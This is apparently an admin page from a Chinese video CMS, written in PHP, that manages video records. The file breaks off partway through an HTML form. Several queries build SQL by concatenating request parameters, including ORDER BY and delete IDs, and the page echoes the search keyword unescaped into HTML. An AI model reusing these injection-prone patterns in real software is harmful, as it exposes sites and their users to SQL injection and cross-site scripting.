<?php
require_once ("admin_conn.php");
require_once ("../inc/pinyin.php");
chkLogin();

$action = be("all","action");
$_SESSION["upfolder"] = "../upload/vod";

switch($action)
{
	case "add":
	case "edit" : headAdmin ("视频管理" ); info();break;
	case "save" : save();break;
	case "del" : del();break;
	case "chkpic" : chkpic();break;
	case "pse" : headAdmin ("视频管理"); pse();break;
	case "pserep" : headAdmin ("视频管理"); pserep();break;
	case "psesave" : psesave();break;
	default : headAdmin ("视频管理"); main();break;
}
dispseObj();

function chkpic()
{
	global $db;
	$flag = "#err". date('Y-m-d',time());
	$num = $db->getOne("SELECT COUNT(*) FROM {pre}vod WHERE d_pic LIKE 'http://%' and instr(d_pic,'".$flag."')=0 ");
	echo $num;exit;
}

function save()
{
	global $db;
    $backurl = be("post", "backurl");
    $flag = be("post", "flag");
    $uptime = be("post", "uptime");
    $rndhits = be("post","rndhits");
    
    $d_id = be("post", "d_id"); $d_name = be("post", "d_name");
    $d_subname = be("post", "d_subname"); $d_enname = be("post", "d_enname");
    $d_type = be("post", "d_type"); $d_state = be("post", "d_state");
    $d_color = be("post", "d_color"); $d_pic = be("post", "d_pic");
    $d_starring = be("post", "d_starring");$d_directed = be("post", "d_directed");
    $d_area = be("post", "d_area"); $d_language = be("post", "d_language");
    $d_level = be("post", "d_level"); $d_stint = be("post", "d_stint");
    $d_hits = be("post", "d_hits"); $d_dayhits = be("post", "d_dayhits");
    $d_weekhits = be("post", "d_weekhits"); $d_monthhits = be("post", "d_monthhits");
    $d_topic = be("post", "d_topic"); $d_content = be("post", "d_content");
    $d_remarks = be("post", "d_remarks"); $d_hide = be("post", "d_hide");
    $d_good = be("post", "d_good"); $d_bad = be("post", "d_bad");
    $d_usergroup = be("post", "d_usergroup"); $d_year = be("post", "d_year");
    $d_addtime = be("post", "d_addtime"); $d_time = be("post", "d_time");
    $d_score = be("post", "d_score"); $d_scorecount = be("post", "d_scorecount");
    $d_letter = be("post", "d_letter");  $d_picthumb = be("post","d_picthumb");
    $d_picslide = be("post","d_picslide"); $d_duration = be("post","d_duration");
    $d_playurl = be("post", "d_playurl"); $d_downurl = be("post", "d_downurl"); 
    $d_stintdown = be("post","d_stintdown");
    
    $urlid = be("arr", "urlid"); $url = be("arr", "url"); $urlfrom = be("arr", "urlfrom"); $urlserver = be("arr", "urlserver");
    $urlidsarr = explode(",",$urlid); $urlarr = explode(",",$url); $urlfromarr = explode(",",$urlfrom); $urlserverarr = explode(",",$urlserver);
    $urlidsarrlen = count($urlidsarr); $urlarrlen=count($urlarr); $urlfromarrlen=count($urlfromarr); $urlserverarrlen=count($urlserverarr);
    
    if(isN($url)) { $urlarrlen=-1; }
    
    $downurlid = be("arr", "downurlid"); $downurl = be("arr", "downurl"); $downurlfrom = be("arr", "downurlfrom");$downurlserver = be("arr", "downurlserver");
    $downurlidsarr = explode(",",$downurlid); $downurlarr = explode(",",$downurl); $downurlfromarr = explode(",",$downurlfrom); $downurlserverarr = explode(",",$downurlserver);
    $downurlidsarrlen = count($downurlidsarr); $downurlarrlen = count($downurlarr); $downurlfromarrlen = count($downurlfromarr);
    $downurlserverarrlen = count($downurlserverarr);
    if(isN($downurl)) { $downurlarrlen=-1; }
    
    $rc = false;
    for ($i=0;$i<$urlidsarrlen;$i++){
        if ($urlarrlen >= $i && $urlfromarrlen >= $i && $urlserverarrlen >= $i){
	        if ($rc){ $d_playurl .= "$$$"; $d_playfrom .= "$$$"; $d_playserver .= "$$$"; }
	        $d_playfrom .= trim($urlfromarr[$i]);
	        $d_playserver .=  trim($urlserverarr[$i]);
	        $d_playurl .= replaceStr(replaceStr(trim($urlarr[$i]), Chr(10), ""), Chr(13), "#");
	        $rc =true;
        }
    }
    
    $rc = false;
    for ($i=0;$i<$downurlidsarrlen;$i++){
        if ($downurlarrlen >= $i && $downurlfromarrlen >=$i && $downurlserverarrlen >= $i){
	        if ($rc){ $d_downurl .= "$$$"; $d_downfrom .= "$$$"; $d_downserver .= "$$$"; }
	        $d_downfrom .= trim($downurlfromarr[$i]);
	        $d_downserver .=  trim($downurlserverarr[$i]);
	        $d_downurl .= replaceStr(replaceStr(trim($downurlarr[$i]), Chr(10), ""), Chr(13), "#");
	        $rc =true;
        }
    }
    	
    if (isN($d_addtime)) {  $d_addtime = date('Y-m-d H:i:s',time()); }
    if( ($flag=="edit" && $uptime=="1") || ($flag=="add") ){
    	$d_time = date('Y-m-d H:i:s',time());
    }
    if($rndhits=="1") { $d_hits= rndNum(1,1000); }
    if(isN($d_name)) { echo "名称不能为空";exit;}
    if(isN($d_type)) { echo "分类不能为空";exit;}
    if(!isNum($d_hide)) { $d_hide = 0;}
    if(!isNum($d_level)) { $d_level = 0;}
    if(!isNum($d_hits)) { $d_hits = 0;}
    if(!isNum($d_dayhits)) { $d_dayhits = 0;}
    if(!isNum($d_weekhits)) { $d_weekhits = 0;}
    if(!isNum($d_monthhits)) { $d_monthhits = 0;}
    if(!isNum($d_topic)) { $d_topic = 0;}
    if(!isNum($d_stint)) { $d_stint = 0;}
    if(!isNum($d_stintdown)) { $d_stintdown=0; }
    if(!isNum($d_state)) { $d_state = 0;}
    if(!isNum($d_score)) { $d_score = 0;}
    if(!isNum($d_scorecount)) { $d_scorecount = 0;}
    if(!isNum($d_good)) { $d_good = 0;}
    if(!isNum($d_bad)) { $d_bad = 0;}
    if(!isNum($d_usergroup)) { $d_usergroup = 0;}
    if(!isNum($d_duration)){ $d_duration=0; }
    if (isN($d_enname)) { $d_enname = Hanzi2PinYin($d_name); }
    if (isN($d_letter)) { $d_letter = strtoupper(substring($d_enname,1)); }
    	
    if (strpos($d_enname, "*")>0 || strpos($d_enname, ":")>0 || strpos($d_enname, "?")>0 || strpos($d_enname, "\"")>0 || strpos($d_enname, "<")>0 || strpos($d_enname, ">")>0 || strpos($d_enname, "|")>0 || strpos($d_enname, "\\")>0){
        echo "名称和拼音名称中: 不能出现英文输入状态下的 * : ? \" < > | \ 等特殊符号";exit;
    }
	
    if ($flag == "edit") {
        $db->Update ("{pre}vod", array("d_name", "d_subname", "d_enname", "d_type","d_letter", "d_state", "d_color", "d_pic","d_picthumb","d_picslide","d_starring", "d_directed", "d_area", "d_year", "d_language", "d_level", "d_stint","d_stintdown", "d_hits","d_dayhits","d_weekhits","d_monthhits", "d_topic", "d_content", "d_remarks","d_good","d_bad", "d_usergroup", "d_score", "d_scorecount", "d_hide", "d_time", "d_duration","d_playurl","d_playfrom", "d_playserver", "d_downurl", "d_downfrom", "d_downserver"), array($d_name, $d_subname, $d_enname, $d_type, $d_letter, $d_state, $d_color, $d_pic,$d_picthumb,$d_picslide, $d_starring, $d_directed, $d_area, $d_year, $d_language, $d_level, $d_stint,$d_stintdown, $d_hits, $d_dayhits, $d_weekhits, $d_monthhits ,$d_topic, $d_content, $d_remarks, $d_good, $d_bad, $d_usergroup, $d_score, $d_scorecount, $d_hide, $d_time,$d_duration, $d_playurl, $d_playfrom, $d_playserver,$d_downurl,$d_downfrom,$d_downserver), "d_id=" . $d_id);
    }
    else{
        $backurl = "admin_vod.php?action=add";
        $db->Add ("{pre}vod", array("d_name", "d_subname", "d_enname", "d_type", "d_letter","d_state", "d_color", "d_pic","d_picthumb","d_picslide", "d_starring", "d_directed", "d_area", "d_year", "d_language", "d_level", "d_stint","d_stintdown", "d_hits","d_dayhits","d_weekhits","d_monthhits", "d_topic", "d_content", "d_remarks", "d_good","d_bad", "d_usergroup", "d_score", "d_scorecount", "d_addtime", "d_time", "d_duration", "d_playurl", "d_playfrom", "d_playserver","d_downurl", "d_downfrom", "d_downserver"), array($d_name, $d_subname, $d_enname, $d_type,$d_letter,  $d_state, $d_color, $d_pic,$d_picthumb,$d_picslide, $d_starring, $d_directed, $d_area, $d_year, $d_language, $d_level, $d_stint,$d_stintdown, $d_hits, $d_dayhits, $d_weekhits, $d_monthhits , $d_topic, $d_content, $d_remarks, $d_good, $d_bad, $d_usergroup, $d_score, $d_scorecount, $d_addtime, $d_time, $d_duration,$d_playurl,$d_playfrom, $d_playserver,$d_downurl,$d_downfrom,$d_downserver));
    }
    
    echo "保存完毕";
}

function del()
{
	global $db,$cache,$template;
	$d_id = be("get","d_id");
	if(isN($d_id)){
		$d_id = be("arr","d_id");
	}
	$arr = explode(",",$d_id);
	foreach($arr as $v){
		$row = $db->getRow("SELECT * FROM {pre}vod WHERE d_id=" .$v);
		if($row){
			$d_pic = $row["d_pic"];
			$d_picthumb = $row["d_picthumb"];
			$d_picslide = $row["d_picslide"];
			$d_type = $row["d_type"];
			$d_name = $row["d_name"];
			$d_enname = $row["d_enname"];
			$d_addtime = $row["d_addtime"];
			$d_playfrom = $row["d_playfrom"];
			$d_playurl = $row["d_playurl"];
			$d_downfrom = $row["d_downfrom"];
			$d_downurl = $row["d_downurl"];
			$typearr = getValueByArray($cache[0], "t_id" ,$d_type );
			$tname="";
			$tenname="";
			if(is_array($typearr)){
				$tname = $typearr["t_name"];
				$tenname = $typearr["t_enname"];
			}
			unset($typearr);
			
			$db->Delete ("{pre}vod","d_id=". $v);
			
			if ( $d_pic!="" && strpos(",".$d_pic,"http://") <=0 ){
				if (file_exists("../".$d_pic)){ unlink( "../".$d_pic) ; }
			}
			if ( $d_picthumb!="" && strpos(",".$d_picthumb,"http://") <=0){
				if ( file_exists("../".$d_picthumb)){ unlink( "../".$d_picthumb) ; }
			}
			if ( $d_picslide!="" && strpos(",".$d_picslide,"http://") <=0){
				if ( file_exists("../".$d_picslide)){ unlink( "../".$d_picslide) ; }
			}
			
			if(app_vodcontentviewtype==2){
				$vlink = $template->getVodLink($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname);
				if (app_installdir != "/"){ $vlink = replaceStr($vlink,app_installdir,"../");} else { $vlink = ".." . $vlink;}
				if (substring($vlink,1,strlen($vlink)-1) =="/"){ $vlink = $vlink . "index." . app_vodsuffix;}
				if ( file_exists($vlink)){ unlink( $vlink) ; }
			}
			
			if(app_vodplayviewtype>2){
				$p="../upload/playdata/" . getDatet("Ymd",$d_addtime) . "/" .$v."/";
				$f=$p.$v.".js";
				if ( file_exists($f) ){ unlink($f) ; }
				if ( is_dir($p) ){ rmdir($p) ; }
				if(app_vodplayviewtype==3){
					$plink = "../". $template->getVodPlayUrl($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname,1,1);
					$plink = substring($plink,strpos($plink,"?"));
					$plink = replaceStr($plink,"../".app_installdir,"../");
					if ( file_exists($plink)){ unlink($plink) ; }
				}
				else if(app_vodplayviewtype==4){
					$fromarr = explode("$$$",$d_playfrom);
					$urlsarr = explode("$$$",$d_playurl);
					for($i=0;$i<count($fromarr);$i++){
						$urls = $urlsarr[$i];
						$urlarr = explode("#",$urls);
						
						for($j=0;$j<count($urlarr);$j++){
							$plink = $template->getVodPlayUrl($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname,$i+1,$j+1);
							if (app_installdir != "/"){ $plink = replaceStr($plink,app_installdir,"../");} else { $plink = ".." .  $plink;}
							if (substring($plink,1,strlen($plink)-1)=="/"){ $plink = $plink . "index." . app_vodsuffix;}
							if ( file_exists($plink)){ unlink($plink) ; }
						}
						unset($urlarr);
					}
					unset($fromarr);
					unset($urlarr);
				}
				else if(app_vodplayviewtype==5){
					$fromarr = explode("$$$",$d_playfrom);
					for($i=0;$i<count($fromarr);$i++){
						$plink = "../". $template->getVodPlayUrl($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname,$i+1,1);
						$plink = substring($plink,strpos($plink,"?"));
						$plink = replaceStr($plink,"../".app_installdir,"../");
						if ( file_exists($plink)){ unlink($plink) ; }
					}
					unset($fromarr);
				}
			}
			if(app_voddownviewtype>2){
				$p="../upload/downdata/" . getDatet("Ymd",$d_addtime) . "/" .$v."/";
				$f=$p.$v.".js";
				if ( file_exists($f) ){ unlink($f) ; }
				if ( is_dir($p) ){ rmdir($p) ; }
				if(app_voddownviewtype==3){
					$plink = "../". $template->getVodDownUrl($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname,1,1);
					$plink = substring($plink,strpos($plink,"?"));
					$plink = replaceStr($plink,"../".app_installdir,"../");
					if ( file_exists($plink)){ unlink($plink) ; }
				}
				else if(app_voddownviewtype==4){
					$fromarr = explode("$$$",$d_downfrom);
					$urlsarr = explode("$$$",$d_downurl);
					for($i=0;$i<count($fromarr);$i++){
						$urls = $urlsarr[$i];
						$urlarr = explode("#",$urls);
						
						for($j=0;$j<count($urlarr);$j++){
							$plink = $template->getVodDownUrl($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname,$i+1,$j+1);
							if (app_installdir != "/"){ $plink = replaceStr($plink,app_installdir,"../");} else { $plink = ".." .  $plink;}
							if (substring($plink,1,strlen($plink)-1)=="/"){ $plink = $plink . "index." . app_vodsuffix;}
							if ( file_exists($plink)){ unlink($plink) ; }
						}
						unset($urlarr);
					}
					unset($fromarr);
					unset($urlarr);
				}
				else if(app_voddownviewtype==5){
					$fromarr = explode("$$$",$d_downfrom);
					for($i=0;$i<count($fromarr);$i++){
						$plink = "../". $template->getVodDownUrl($v,$d_name,$d_enname,$d_addtime,$d_type,$tname,$tenname,$i+1,1);
						$plink = substring($plink,strpos($plink,"?"));
						$plink = replaceStr($plink,"../".app_installdir,"../");
						if ( file_exists($plink)){ unlink($plink) ; }
					}
					unset($fromarr);
				}
			}
		}
		unset($row);
	}
	redirect ( getReferer() );
}

function main()
{
	global $db,$template,$cache;
    $keyword = be("all", "keyword"); $stype = be("all", "stype");
    $area = be("all", "area");   $topic = be("all", "topic");
    $level = be("all", "level");     $from = be("all", "from"); $down = be("all","down");
    $sserver = be("all", "sserver");  $sstate = be("all", "sstate");
    $repeat = be("all", "repeat");   $repeatlen = be("all", "repeatlen");
    $order = be("all", "order");     $pagenum = be("all", "page");
    $spic = be("all", "spic");    $hide = be("all", "hide");
    $lang = be("all", "lang");  $scol = be("all","scol");
    $repeattype = be("all","repeattype");
    
    if(!isNum($level)) { $level = 0;} else { $level = intval($level);}
    if(!isNum($sstate)) { $sstate = 0;} else { $sstate = intval($sstate);}
    if(!isNum($stype)) { $stype = 0;} else { $stype = intval($stype);}
    if(!isNum($topic)) { $topic = 0;} else { $topic = intval($topic);}
    if(!isNum($spic)) { $spic = 0;} else { $spic = intval($spic);}
    if(!isNum($hide)) { $hide=-1;} else { $hide = intval($hide);}
    if(!isNum($repeatlen)) { $repeatlen = 0;}
	if (!isNum($pagenum)){ $pagenum = 1;} else { $pagenum = intval($pagenum);}
	if ($pagenum < 1) { $pagenum = 1; }
    if(isN($scol)){ $scol="d_name"; }
    if(isN($repeattype)){ $repeattype="d_name"; }
    
    $where = " 1=1 ";
    if (!isN($keyword)) {
    	if($scol=="d_starring"){
    		$where .= " AND d_starring LIKE '%" . $keyword . "%' ";
    	}
    	else if($scol=="d_directed"){
    		$where .= " AND d_directed LIKE '%" . $keyword . "%' ";
    	}
    	else{
    		$where .= " AND d_name LIKE '%" . $keyword . "%' ";
    	}
    }
    if ($stype > 0) { 
    	$typearr = getValueByArray($cache[0], "t_id" ,$stype );
		if(is_array($typearr)){
			$where = $where . " and d_type in (" . $typearr["childids"] . ")";
		}
		else{
    		$where .= " AND d_type=" . $stype . " ";
    	}
    }
    if ($stype ==-1) { $where .= " AND d_type=0 ";}
    if (!isN($area)) { $where .= " AND d_area = '" . $area . "' ";}
    if (!isN($lang)) { $where .= " AND d_language = '" . $lang . "' ";}
    if ($topic > 0) { $where .= " AND d_topic = " . $topic . " ";}
    if ($level > 0) { $where .= " AND d_level = " . $level . " ";}
    if ($sstate ==1){ 
    	$where .= " AND d_state>0 "; 
    }
    else if ($sstate==2){ 
    	$where .= " AND d_state=0 ";
    }
    
    if($hide>-1){
    	$where .= " AND d_hide=".$hide ." ";
    }
    
    if ($repeat == "ok"){
    	if($repeattype=="d_enname"){
    		$repeatSearch = " d_enname ";
    		if($repeatlen>0){ $repeatSearch = " substring(d_enname,1,".$repeatlen.") "; }
    		$where .= " AND `{pre}vod`.`d_enname`=`t2`.`d_name1` ";
    	}
    	else{
    		$repeatSearch = " d_name ";
    		if($repeatlen>0){ $repeatSearch = " substring(d_name,1,".$repeatlen.") "; }
    		$where .= " AND `{pre}vod`.`d_name`=`t2`.`d_name1` ";
    	}
        $repeatsql = " , (SELECT ". $repeatSearch ." as d_name1 FROM {pre}vod GROUP BY d_name1 HAVING COUNT(*)>1) as `t2` ";
        if(isN($order)){ $order= "d_name,d_addtime"; }
    }
    
    if (isN($order)) { $order = "d_time";}
    if(!isN($sserver)) { $where .= " AND d_playserver like '%" . $sserver . "%' ";}
    if(!isN($from)) { $where .= " and d_playfrom like  '" . $from . "%' ";}
    if(!isN($down)) { $where .= " and d_downfrom like  '" . $down . "%' ";}
    
    if($spic==1){
    	$where .= " AND d_pic = '' ";
    }
    else if($spic==2){
    	$where .= " AND d_pic like 'http://%' ";
    }
    else if($spic==3){
    	$where .= " AND d_pic like '%#err%' ";
    }
    
    $sql = "SELECT count(*) FROM {pre}vod ".$repeatsql." where ".$where;
	$nums = $db->getOne($sql);
	$pagecount=ceil($nums/app_pagenum);
    $sql = "SELECT d_id, d_name, d_enname, d_type,d_state,d_topic,d_color,d_level, d_hits,d_addtime, d_time,d_remarks,d_playfrom,d_downfrom,d_hide FROM {pre}vod ".$repeatsql."  WHERE" . $where . " ORDER BY " . $order . " DESC limit ".(app_pagenum * ($pagenum-1)) .",".app_pagenum;
    
	$rs = $db->query($sql);
?>
<style>select { width:150px; }</style>
<script language="javascript">
$(document).ready(function(){
	$("#form1").validate({
		rules:{
			repeatlen:{
				number:true,
				max:10
			}
		}
	});
	$("#btnsearch").click(function(){
		$("#repeatok").val("");
		filter();
	});
	$("#btnrepeat").click(function(){
		var repeatlen = $("#repeatlen").val();
		var reg = /^\d+$/;
		var re = repeatlen.match(reg);
		if (repeatlen=="" || !re){ repeatlen=0; }
		if (repeatlen >20){ alert("长度最大20");$("#repeatlen").focus();return;}
		$("#repeatok").val("ok");
		filter();
	});
	$("#btnDel").click(function(){
			if(confirm('确定要删除吗')){
				$("#form1").attr("action","admin_vod.php?action=del");
				$("#form1").submit();
			}
			else{return false}
	});
	$("#plsc").click(function(){
		var ids="",rc=false;
		$("input[name='d_id']").each(function() {
			if(this.checked){
				if(rc)ids+=",";
				ids =  ids + this.value;
				rc=true;
			}
        });
		$("#form1").attr("action","admin_makehtml.php?action=viewpl&flag=vod&d_id="+ids);
		$("#form1").submit();
	});
	$("#btnCancel").click(function(){
		$('#win1').window('close'); 
	});
	$('#pic_fwdate').datebox({
	    formatter: function(date){ return date.getFullYear()+'-'+(date.getMonth()+1)+'-'+date.getDate();},
	    parser: function(date){ return new Date(Date.parse(date.replace(/-/g,"/")));}
	});
});
function filter(){
	var url = "admin_vod.php?stype="+$("#stype").val()+"&topic="+$("#topic").val()+"&level="+$("#level").val()+"&order="+$("#order").val()+"&sserver="+$("#sserver").val()+"&sstate="+$("#state").val()+"&from="+$("#from").val()+"&down="+$("#down").val()+"&spic="+$("#spic").val()+"&hide="+$("#hide").val() +"&repeat="+$("#repeatok").val()+"&repeatlen="+$("#repeatlen").val() + "&scol="+ $("#scol").val() + "&repeattype="+ $("#repeattype").val() + "&keyword="+encodeURI($("#keyword").val())+ "&area="+encodeURI($("#area").val())+ "&lang="+encodeURI($("#lang").val());
	window.location.href=url;
}
function showpic(){
	$.get("admin_vod.php?action=chkpic&rnd=" + Math.random(),function(obj){
		if(Number(obj)>0){
			$.messager.show({
			title:'系统提示',
			msg:'发现数据中调用远程图片<br>下载到本地可以提高网页载入速度<br>',
			timeout:5000,
			showType:'slide'
			});
		}
	});
}
function gosyncpic(){
	$('#win1').window('open');
}
</script>
<table class="tb">
	<tr>
	<td>
	<table width="96%" border="0" align="center" cellpadding="3" cellspacing="1">
	<tr>
	<td colspan="2">
	<select id="stype" name="stype">
	<option value="0">视频栏目</option>
	<option value="-1" <?php if($stype==-1){ echo "selected";} ?>>没有栏目</option>
	<?php echo makeSelectAll("{pre}vod_type","t_id","t_name","t_pid","t_sort",0,"","&nbsp;|&nbsp;&nbsp;",$stype)?>
	</select>
	&nbsp;
	<select id="state" name="state">
	<option value="0">视频连载</option>
	<option value="1" <?php if($sstate=="1"){ echo "selected";} ?>>连载中</option>
	<option value="2" <?php if($sstate=="2"){ echo "selected";} ?>>未连载</option>
	</select>
	&nbsp;
	<select id="order" name="order">
	<option value="d_time">视频排序</option>
	<option value="d_id" <?php if($order=="d_id"){ echo "selected";} ?>>视频编号</option>
	<option value="d_name" <?php if($order=="d_name"){ echo "selected";} ?>>视频名称</option>
	<option value="d_hits" <?php if($order=="d_hits"){ echo "selected";} ?>>视频人气</option>
	</select>
	&nbsp;
	<select id="level" name="level">
	<option value="0">视频推荐</option>
	<option value="1" <?php if($level==1) { echo "selected";} ?>>推荐1</option>
	<option value="2" <?php if($level==2) { echo "selected";} ?>>推荐2</option>
	<option value="3" <?php if($level==3) { echo "selected";} ?>>推荐3</option>
	<option value="4" <?php if($level==4) { echo "selected";} ?>>推荐4</option>
	<option value="5" <?php if($level==5) { echo "selected";} ?>>推荐5</option>
	</select>
	&nbsp;
	<select id="area" name="area">
	<option value="">视频地区</option>
	<?php echo makeSelectAreaLang("area",$area)?>
    </select>
	&nbsp;
    <select id="lang" name="lang">
    <option value="">视频语言</option>
    <?php echo makeSelectAreaLang("lang",$lang)?>
	</select>
	<br>
	<select id="topic" name="topic">
	<option value="0">视频专题</option>
	<?php echo makeSelect("{pre}vod_topic","t_id","t_name","t_sort","","&nbsp;|&nbsp;&nbsp;",$topic)?>
	</select>
	&nbsp;
	<select id="sserver" name="sserver">
	<option value="">视频服务器组</option>
	<?php echo makeSelectServer($sserver)?>
	</select>
	&nbsp;
	<select id="from" name="from">
	<option value="">视频播放器</option>
	<?php echo makeSelectPlayer($from)?>
	</select>
	&nbsp;
	<select id="down" name="down">
	<option value="">视频下载器</option>
	<?php echo makeSelectDown($down)?>
	</select>
	&nbsp;
	<select id="spic" name="spic">
	<option value="0">视频图片</option>
	<option value="1" <?php if ($spic==1){ echo "selected";} ?>>无图片</option>
	<option value="2" <?php if ($spic==2){ echo "selected";} ?>>远程图片</option>
	<option value="3" <?php if ($spic==3){ echo "selected";} ?>>同步出错图</option>
	</select>
	&nbsp;
	<select id="hide" name="hide">
	<option value="-1">视频显隐</option>
	<option value="0" <?php if ($hide==1){ echo "selected";} ?>>显示</option>
	<option value="1" <?php if ($hide==2){ echo "selected";} ?>>隐藏</option>
	</select>
	</td>
	</tr>
	<tr>
	<td>
	关键字：<input id="keyword" size="60" name="keyword" value="<?php echo $keyword?>">
	<select id="scol" name="scol" style="width:60px">
	<option value="d_name">名称</option>
	<option value="d_starring" <?php if ($scol=="d_starring"){ echo "selected";} ?>>主演</option>
	<option value="d_directed" <?php if ($scol=="d_directed"){ echo "selected";} ?>>导演</option>
	</select>
	<input class="input" type="button" value="搜索" id="btnsearch">
	<span <?php if($repeat!="ok"){ echo "style=\"display:none\""; }?>>
	&nbsp; 检测名称长度：<input id="repeatlen" size="2" name="repeatlen" >
	&nbsp; 检测字段：<select id="repeattype" name="repeattype" style="width:50px">
	<option value="d_name">名称</option>
	<option value="d_enname" <?php if ($repeattype=="d_enname"){ echo "selected";} ?>>拼音</option>
	</select>
	<input type="hidden" id="repeatok" value="">
	&nbsp;<input class="input" type="button" value="检测重复数据" id="btnrepeat">
	</span>
	</td>
	<td width="150px">
		<span>【<a href="###" onclick="javascript:gosyncpic();"><font color="red"><strong>同步下载远程图片</strong></font></a>】</span>
	</td>
	</tr>
	</table>
	</td>
	</tr>
</table>

<form id="form1" name="form1" method="post">
<table class="tb">
	<tr>
	<td width="4%">&nbsp;</td>
	<td width="5%">编号</td>
	<td>名称  (<font color=red>[连载]</font><font color=blue>[备注]</font>)</td>
	<td width="10%">分类</td>
	<td width="9%">来源</td>
	<td width="6%">人气</td>
	<td width="5%">推荐</td>
	<td width="5%">专题</td>
	<td width="5%">浏览</td>
	<td width="15%">更新时间</td>
	<td width="11%">操作</td>
	</tr>
	<?php
		if($nums==0){
	?>
	<tr><td align="center" colspan="12">没有任何记录!</td></tr>
	<?php
		}
		else{
			while ($row = $db ->fetch_array($rs))
		  	{
		  		$d_id=$row["d_id"];
		  		$tname= "未知";
				$tenname="";
		  		$typearr = getValueByArray($cache[0], "t_id" ,$row["d_type"] );
				if(is_array($typearr)){
					$tname= $typearr["t_name"];
					$tenname= $typearr["t_enname"];
				}
	?>
    <tr>
	<td><input name="d_id[]" type="checkbox" value="<?php echo $d_id?>"></td>
	<td><?php echo $d_id?></td>
	<td><?php echo getColorText($row["d_name"],$row["d_color"],20)?>
	<?php if($row["d_state"] > 0) {?><?php echo "<font color=\"red\">[" .$row["d_state"] . "]</font>"; }?>
	<?php if(!isN($row["d_remarks"])) {?><?php echo "<font color=\"blue\">[" .$row["d_remarks"] . "]</font>"; }?>
	<?php if($row["d_hide"]==1){echo "<font color=\"red\">[隐藏]</font>";} ?>
	</td>
	<td><?php echo $tname?></td>
	<td><?php echo replaceStr($row["d_playfrom"],"$$$",",")?></td>
	<td><?php echo $row["d_hits"]?></td>
	<td id="tj<?php echo $d_id?>">
	<?php echo "<img src=\"../images/icons/ico".$row["d_level"].".gif\" border=\"0\" style=\"cursor: pointer;\" onClick=\"setday('tj','".$d_id."','vod')\"/>"?>
	</td>
	<td id="zt<?php echo $d_id?>" >
	<?php if($row["d_topic"]==0) {?>
	<?php echo "<img src=\"../images/icons/icon_02.gif\" border=\"0\" style=\"cursor: pointer;\" onClick=\"setday('zt','".$d_id."','vod')\"/>"?>
	<?php }else{?>
	<?php echo "<img src=\"../images/icons/icon_01.gif\" border=\"0\" style=\"cursor: pointer;\" onClick=\"ajaxdivdel('".$d_id."','zt','vod')\"/>"?>
	<?php }?>
	</td>
	<td>
	<?php
	if (app_playtype ==0){
	 	if ($row["d_type"] == 0){
			$mlink = "#";
		}
		else{
	 		$mlink = "../".$template->getVodLink($d_id,$row["d_name"],$row["d_enname"],$row["d_addtime"],$row["d_type"],$tname,$tenname);
		}
		$mlink = replaceStr($mlink,"../".app_installdir,"../");
	 	$plink = $mlink;
	}
	 else{
	 	$mlink = "../".$template->getVodPlayUrl($d_id,$row["d_name"],$row["d_enname"],$row["d_addtime"],$row["d_type"],$tname,$tenname,1,1);
	 	$mlink = replaceStr($mlink,"../".app_installdir,"../");
	 	$plink= $mlink;
	 	$mlink = replaceStr($mlink,"javascript:OpenWindow1('","");
	 	$mlink = replaceStr($mlink,"',popenW,popenH);","");
	 }
	 
	 if (substring($mlink,1,strlen($mlink)-1)=="/") { $mlink = $mlink ."index.". app_vodsuffix;}
	 if (app_vodcontentviewtype == 2) {
		 if (file_exists($mlink)){
		 	?>
		 	<a target="_blank" href="<?php echo $plink?>"><Img src="../images/icons/html_ok.gif" border="0" alt='浏览' /></a>
		 	<?php
		 }
		 else{
		 	?>
		 	<a  href="admin_makehtml.php?action=viewpl&flag=vod&d_id=<?php echo $d_id?>"><Img src="../images/icons/html_no.gif" border="0" alt='生成' /></a>
		 	<?php
		 }
	}
	 else{
	 ?>
	 	<a target="_blank" href="<?php echo $plink?>"><Img src="../images/icons/html_ok.gif" border="0" alt='浏览' /></a>
	 <?php
	 }
	?>
	 </td>
	<td><?php echo getColorDay($row["d_time"])?></td>
	<td><a href="admin_vod.php?action=edit&id=<?php echo $d_id?>">修改</a> | <A href="admin_vod.php?action=del&d_id=<?php echo $d_id?>" onClick="return confirm('确定要删除吗?');">删除</a></td>
    </tr>
	<?php
			}
		}
	?>
	<tr>
	<td colspan="12">
	全选<input name="chkall" type="checkbox" id="chkall" value="1" onClick="checkAll(this.checked,'d_id[]');"/>&nbsp;
    批量操作：<input type="button" id="btnDel" value="删除" class="input">
	<input type="button" id="pltj" value="推荐" onClick="plset('pltj','vod')" class="input">
	<input type="button" id="plfl" value="分类" onClick="plset('plfl','vod')" class="input">
	<input type="button" id="plzt" value="专题" onClick="plset('plzt','vod')" class="input">
	<input type="button" id="plrq" value="人气" onClick="plset('plrq','vod')" class="input">
	<input type="button" id="plsc" value="生成" class="input">
	<input type="button" id="plyc" value="显隐" onClick="plset('plyc','vod')" class="input">
	<span id="plmsg" name="plmsg"></span>
	</td>
	</tr>
	<tr>
	<td align="center" colspan="12">
	<?php echo pagelist_manage($pagecount,$pagenum,$nums,app_pagenum,"admin_vod.php?page={p}&topic=" . $topic . "&level=".$level."&order=".$order ."&stype=" . $stype ."&sserver=" . $sserver ."&sstate=".$sstate."&repeat=".$repeat."&repeatlen=".$repeatlen."&from=".$from."&down=".$down."&spic=".$spic."&hide=".$hide. "&keyword=". urlencode($keyword). "&area=". urlencode($area). "&lang=". urlencode($lang)."&scol=".$scol ."&repeattype=".$repeattype)?>
	</td>
	</tr>
</table>
</form>

<div id="win1" class="easyui-window" title="窗口" style="padding:5px;width:450px;" closed="true" closable="false" minimizable="false" maximizable="false">
<form action="admin_pic.php?action=syncpic" method="post" name="form2" id="form2">
<table class="tb">
	<tr>
	<td width="20%">同步范围：</td>
	<td> 全部<input type="radio" id="pic_fw1" name="pic_fw" value="1" checked> 视频日期<input type="radio" id="pic_fw2" name="pic_fw" value="2" > <input id="pic_fwdate" name="pic_fwdate" class="easyui-datebox" /> 
	</td>
	</tr>
	<tr>
	<td>同步选项：</td>
	<td> 全部<input type="radio" id="pic_xx1" name="pic_xx" value="0" > 非出错图<input type="radio" id="pic_xx2" name="pic_xx" value="1" checked> 非当天错图<input type="radio" id="pic_xx2" name="pic_xx" value="2" > 出错图<input type="radio" id="pic_xx3" name="pic_xx" value="3" >
	</td>
	</tr>
    <tr align="center">
